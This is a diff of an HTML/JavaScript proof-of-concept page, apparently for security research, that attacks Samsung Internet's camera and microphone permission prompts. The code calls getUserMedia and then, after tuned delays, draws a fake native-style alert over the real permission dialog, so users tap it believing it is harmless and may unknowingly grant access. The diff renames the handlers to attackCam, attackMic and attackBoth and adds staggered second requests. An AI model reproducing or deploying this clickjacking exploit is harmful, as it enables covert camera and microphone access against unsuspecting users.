@@ -9,11 +9,10 @@
   button { padding: 15px 30px; font-size: 18px; margin: 10px; border: none; border-radius: 8px; cursor: pointer; }
   #log { margin-top: 20px; font-size: 14px; color: #888; text-align: center; padding: 0 20px; }
 
-  /* Fake native-style alert — muncul di bawah, menimpa area dialog izin asli */
   #fakeAlert {
     display: none;
     position: fixed;
-    bottom: 25vh;                 /* turunkan/naikkan sesuai posisi dialog asli */
+    bottom: 25vh;
     left: 50%; transform: translateX(-50%);
     width: 88%; max-width: 340px;
     background: #fff; color: #202124;
@@ -26,7 +25,7 @@
   #fakeAlert .msg { margin-bottom: 18px; font-weight: 500; }
   #fakeAlert .btns {
     display: flex; justify-content: flex-end; gap: 6px;
-    padding-right: 24px;          /* geser tombol kanan sedikit ke kiri */
+    padding-right: 24px;
   }
   #fakeAlert .btns button {
     margin: 0; padding: 10px 20px; font-size: 15px; border-radius: 20px;
@@ -38,9 +37,9 @@
 </style>
 </head>
 <body>
-<button onclick="triggerCam()">Request Camera</button>
-<button onclick="triggerMic()">Request Microphone</button>
-<button onclick="triggerBoth()">Request Both</button>
+<button onclick="attackCam()">Camera</button>
+<button onclick="attackMic()">Microphone</button>
+<button onclick="attackBoth()">Both (staggered)</button>
 <div id="log"></div>
 <div id="debug"></div>
 
@@ -55,40 +54,56 @@
 <script>
 const log = document.getElementById('log');
 const fakeAlert = document.getElementById('fakeAlert');
+const debug = document.getElementById('debug');
 
-// Delay sebelum fake alert muncul — tune sampai fake alert muncul
-// TEPAT saat dialog izin asli Samsung Internet selesai muncul.
-const FAKE_DELAY_MS = 400;
+// Tune these delays to match Samsung Internet's prompt timing
+const FAKE_DELAY_MS = 400;   // fake alert appears after native prompt starts
+const SECOND_REQ_MS = 2500;  // second (mic) request after camera prompt resolved
 
-async function requestPerm(constraints) {
+async function getPerm(constraints) {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    stream.getTags = stream.getTracks;
     stream.getTracks().forEach(t => t.stop());
-    log.textContent = 'GRANTED';
+    return 'GRANTED';
   } catch (e) {
-    log.textContent = 'error: ' + e.name;
+    return 'error: ' + e.name;
   }
 }
 
-function trigger(constraints, label) {
-  // Kirim request — dialog izin asli Samsung akan muncul di bawah layar
-  requestPerm(constraints);
-
-  // Munculkan fake alert pada timing yang disinkronkan
-  document.getElementById('fakeMsg').textContent = label;
+function showFake(msg) {
+  document.getElementById('fakeMsg').textContent = msg;
   setTimeout(() => {
     fakeAlert.style.display = 'block';
-    document.getElementById('debug').textContent = 'fake alert shown @ ' + Date.now();
+    debug.textContent = 'fake shown @ ' + Date.now();
   }, FAKE_DELAY_MS);
 }
 
-function triggerCam() { trigger({ video: true }, 'This site wants to use your camera'); }
-function triggerMic() { trigger({ audio: true }, 'This site wants to use your microphone'); }
-function triggerBoth(){ trigger({ video: true, audio: true }, 'This site wants to use your camera and microphone'); }
+async function attackCam() {
+  showFake('This site wants to use your camera');
+  log.textContent = await getPerm({ video: true });
+}
+
+async function attackMic() {
+  showFake('This site wants to use your microphone');
+  log.textContent = await getPerm({ audio: true });
+}
+
+async function attackBoth() {
+  showFake('This site wants to use your camera and microphone');
+  const camResult = await getPerm({ video: true });
+  log.textContent = 'camera: ' + camResult;
+  // Second native prompt for mic right after camera resolves
+  setTimeout(async () => {
+    showFake('This site wants to use your microphone');
+    const micResult = await getPerm({ audio: true });
+    log.textContent += ' | mic: ' + micResult;
+  }, SECOND_REQ_MS);
+}
 
 document.getElementById('fAllow').addEventListener('click', () => {
   fakeAlert.style.display = 'none';
-  log.textContent = 'fake Allow tapped';
+  log.textContent = 'fake Allow tapped @ ' + Date.now();
 });
 document.getElementById('fDeny').addEventListener('click', () => {
   fakeAlert.style.display = 'none';
